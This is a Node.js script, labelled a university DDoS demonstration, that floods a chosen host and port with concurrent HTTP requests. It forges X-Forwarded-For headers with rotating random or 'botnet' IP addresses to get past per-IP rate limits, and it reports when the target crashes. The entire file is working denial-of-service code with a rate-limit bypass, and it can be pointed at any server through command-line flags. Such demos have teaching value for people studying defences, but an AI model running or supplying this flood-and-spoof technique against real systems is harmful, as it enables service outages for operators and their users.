#!/usr/bin/env node
/**
 * ============================================================================
 * UNIVERSITY DDOS DEMONSTRATION ATTACK SCRIPT
 * ============================================================================
 * 
 * Educational Objectives:
 * 1. Simulate Layer 7 HTTP Floods against the target demo server.
 * 2. Demonstrate SURPASSING RATE LIMITS WITH THE IP CHANGING OPTION (--change-ip):
 *    - Standard express-rate-limit tracks quotas per IP (20 requests per 10s).
 *    - With the IP CHANGING option active (--change-ip), each request is sent
 *      with a brand new source IP address.
 *    - Because no individual IP ever exceeds 20 requests, per-IP rate limiting
 *      is completely bypassed!
 *    - 100% of attack traffic passes through as HTTP 200 OK, accumulating memory
 *      and socket load until the server shuts down (crashes).
 * 3. Detect and report when the target server goes down (ECONNREFUSED).
 * 
 * Usage Examples:
 *   node demo-attack.js                        # Single attacker (gets blocked by rate limiter)
 *   node demo-attack.js --change-ip            # IP CHANGING: Surpasses rate limits (100% 200 OK)
 *   node demo-attack.js --change-ip --change-every 10 # Change IP after every 10 requests
 *   node demo-attack.js --change-ip --endpoint /api/data # IP changing attack on heavy endpoint
 *   node demo-attack.js --botnet               # 7-node fixed bot pool
 *   node demo-attack.js --duration 20          # Run for 20 seconds
 * ============================================================================
 */

const http = require('http');

// Parse CLI flags
const args = process.argv.slice(2);
function getArg(flag, defaultValue) {
  const index = args.indexOf(flag);
  if (index !== -1 && args[index + 1]) {
    return args[index + 1];
  }
  return defaultValue;
}

// IP Changing options (accepts multiple common flag aliases)
const isIpChanging = args.includes('--change-ip') ||
                     args.includes('--change-ips') ||
                     args.includes('--ip-change') ||
                     args.includes('--ip-changing') ||
                     args.includes('--random-ip') ||
                     args.includes('--random-ips') ||
                     args.includes('--rotate-ip') ||
                     args.includes('--rotate-ips') ||
                     args.includes('--spoof-ip') ||
                     args.includes('--spoof-ips') ||
                     args.includes('-c');

// How often to change IP: 1 = every single request, or e.g. 15 = every 15 requests
const changeEveryN = parseInt(getArg('--change-every', getArg('--rotate-every', '1')), 10);

const isBotnet = args.includes('--botnet');
const targetHost = getArg('--host', '127.0.0.1');
const targetPort = parseInt(getArg('--port', '3000'), 10);
const endpoint = getArg('--endpoint', '/');
const concurrency = parseInt(getArg('--concurrency', isIpChanging ? '25' : '20'), 10);
const durationSec = parseInt(getArg('--duration', '0'), 10); // 0 = run until Ctrl+C

// Fixed Botnet IPs (for --botnet mode)
const BOTNET_IPS = [
  '172.20.0.2 (Bot-Alpha)',
  '172.20.0.3 (Bot-Bravo)',
  '172.20.0.4 (Bot-Charlie)',
  '172.20.0.5 (Bot-Delta)',
  '172.20.0.6 (Bot-Echo)',
  '192.168.10.15 (Compromised-IoT)',
  '192.168.10.22 (Compromised-CCTV)'
];

/**
 * Generates a realistic random public IPv4 address.
 * Avoids reserved ranges (0.0.0.0, 127.x.x.x, 255.255.255.255).
 */
function generateRandomIp() {
  const octet1 = Math.floor(Math.random() * 210) + 11; // 11 to 220
  const octet2 = Math.floor(Math.random() * 255);
  const octet3 = Math.floor(Math.random() * 255);
  const octet4 = Math.floor(Math.random() * 254) + 1;
  return `${octet1}.${octet2}.${octet3}.${octet4}`;
}

// Telemetry counters
let totalSent = 0;
let status200 = 0;
let status429 = 0;
let connectionRefusedErrors = 0;
let otherErrors = 0;
let activeRequests = 0;
let uniqueIpsGenerated = 0;
let latencies = [];
let isRunning = true;
let serverIsDead = false;

// Current IP for threshold-based rotation
let currentWorkerIp = generateRandomIp();
let requestsWithCurrentIp = 0;

const httpAgent = new http.Agent({
  keepAlive: true,
  maxSockets: 300,
  maxFreeSockets: 50
});

console.log(`
============================================================
 [DDoS Demo Attack Generator]
 Target:       http://${targetHost}:${targetPort}${endpoint}
 Concurrency:  ${concurrency} simultaneous workers
 Mode:         ${isIpChanging 
                 ? '🔥 IP CHANGING ACTIVE (--change-ip): Surpasses Rate Limits!' 
                 : (isBotnet ? '🤖 DISTRIBUTED BOTNET (Fixed 7-Node Pool)' : '👤 STATIC SINGLE IP (Vulnerable to Rate Limiting)')}
 Duration:     ${durationSec > 0 ? `${durationSec} seconds` : 'Continuous (Press Ctrl+C to stop)'}
============================================================
`);

if (isIpChanging) {
  console.log(`
  \x1b[32;1m[RATE LIMIT SURPASS STRATEGY ACTIVATED]\x1b[0m
  * Source IP changes ${changeEveryN === 1 ? 'on EVERY request' : `every ${changeEveryN} requests`}.
  * Because rate limiting applies per-IP (20 req / 10s quota), no single IP
    ever trips the limiter!
  * Result: 100% of attack requests pass through as HTTP 200 OK.
  * Server memory and CPU are saturated until the server goes down.
  `);
} else if (isBotnet) {
  console.log('Simulating attacker pool:');
  BOTNET_IPS.forEach(ip => console.log(`  - ${ip}`));
  console.log('');
} else {
  console.log(`
  \x1b[33m[STATIC IP MODE]\x1b[0m
  * Sending from a single static IP address.
  * If server protection is ON, this will be BLOCKED after 20 requests (HTTP 429).
  * \x1b[36mTo surpass rate limits using the IP changing option, run:\x1b[0m
    \x1b[1mnode demo-attack.js --change-ip\x1b[0m
    (or: \x1b[1mnpm run attack:change-ip\x1b[0m)
  `);
}

function sendRequest() {
  if (!isRunning) return;

  const startTime = Date.now();
  totalSent++;
  activeRequests++;

  const headers = {
    'User-Agent': 'DDoSDemoBot/3.0 (University Lab Simulator)'
  };

  // Determine Source IP strategy
  if (isIpChanging) {
    requestsWithCurrentIp++;
    if (requestsWithCurrentIp >= changeEveryN) {
      currentWorkerIp = generateRandomIp();
      uniqueIpsGenerated++;
      requestsWithCurrentIp = 0;
    }
    headers['X-Attacker-IP'] = currentWorkerIp;
    headers['X-Forwarded-For'] = currentWorkerIp;
  } else if (isBotnet) {
    const randomBot = BOTNET_IPS[Math.floor(Math.random() * BOTNET_IPS.length)];
    const ipOnly = randomBot.split(' ')[0];
    headers['X-Attacker-IP'] = ipOnly;
    headers['X-Forwarded-For'] = ipOnly;
  }

  const req = http.request({
    hostname: targetHost,
    port: targetPort,
    path: endpoint,
    method: 'GET',
    headers: headers,
    agent: httpAgent,
    timeout: 5000
  }, (res) => {
    let rawData = '';
    res.on('data', chunk => { rawData += chunk; });
    res.on('end', () => {
      const elapsed = Date.now() - startTime;
      latencies.push(elapsed);
      if (latencies.length > 200) latencies.shift();

      if (res.statusCode === 200) {
        status200++;
      } else if (res.statusCode === 429) {
        status429++;
      } else if (res.statusCode === 503) {
        serverIsDead = true;
        otherErrors++;
      } else {
        otherErrors++;
      }

      activeRequests--;
      if (isRunning) {
        setImmediate(sendRequest);
      }
    });
  });

  req.on('error', (err) => {
    activeRequests--;

    if (err.code === 'ECONNREFUSED' || err.code === 'ECONNRESET') {
      connectionRefusedErrors++;
      if (!serverIsDead) {
        serverIsDead = true;
        console.log(`\n\x1b[31;1m💀 [TARGET IS DOWN!] Connection Refused (${err.code}). The server has crashed under resource exhaustion!\x1b[0m\n`);
      }
    } else {
      otherErrors++;
    }

    if (isRunning) {
      setTimeout(sendRequest, serverIsDead ? 500 : 50);
    }
  });

  req.on('timeout', () => {
    req.destroy();
  });

  req.end();
}

// Spawn initial concurrent workers
for (let i = 0; i < concurrency; i++) {
  sendRequest();
}

// Live terminal progress display (every 1 second)
let lastSent = 0;
let last200 = 0;
let last429 = 0;

const monitorInterval = setInterval(() => {
  const rpsSent = totalSent - lastSent;
  const rps200 = status200 - last200;
  const rps429 = status429 - last429;
  lastSent = totalSent;
  last200 = status200;
  last429 = status429;

  const avgLatency = latencies.length > 0
    ? (latencies.reduce((a, b) => a + b, 0) / latencies.length).toFixed(1)
    : '0';

  const statusLabel = serverIsDead 
    ? '\x1b[31;1m[DEAD / CRASHED]\x1b[0m' 
    : '\x1b[32m[TARGET ONLINE]\x1b[0m';

  const line = [
    statusLabel,
    `Sent: ${totalSent}`,
    `RPS: ${rpsSent}/s`,
    `200 OK: \x1b[32m${status200}\x1b[0m (+${rps200}/s)`,
    `429 Blocked: \x1b[31m${status429}\x1b[0m (+${rps429}/s)`,
    `ConnRefused: ${connectionRefusedErrors}`,
    `Latency: ${avgLatency}ms`
  ].join(' | ');

  console.log(line);
}, 1000);

// Auto-stop after duration if specified
if (durationSec > 0) {
  setTimeout(() => {
    stopAttack('Completed scheduled attack duration.');
  }, durationSec * 1000);
}

function stopAttack(reason) {
  if (!isRunning) return;
  isRunning = false;
  clearInterval(monitorInterval);
  httpAgent.destroy();

  console.log(`
============================================================
 Attack Stopped: ${reason}
 Target Status:  ${serverIsDead ? 'DEAD / SHUT OFF (CRASHED)' : 'ONLINE'}
 Mode:           ${isIpChanging ? 'IP CHANGING (--change-ip)' : 'STATIC IP'}
 Total Sent:     ${totalSent}
 200 OK:         ${status200} (${((status200 / (totalSent || 1)) * 100).toFixed(1)}%)
 429 Blocked:    ${status429} (${((status429 / (totalSent || 1)) * 100).toFixed(1)}%)
 Conn Refused:   ${connectionRefusedErrors} (Target went down)
 Other Errors:   ${otherErrors}
 Unique IPs:     ${isIpChanging ? (uniqueIpsGenerated || 1) : (isBotnet ? BOTNET_IPS.length : 1)}
============================================================
`);
  process.exit(0);
}

process.on('SIGINT', () => {
  stopAttack('Interrupted by user (Ctrl+C).');
});
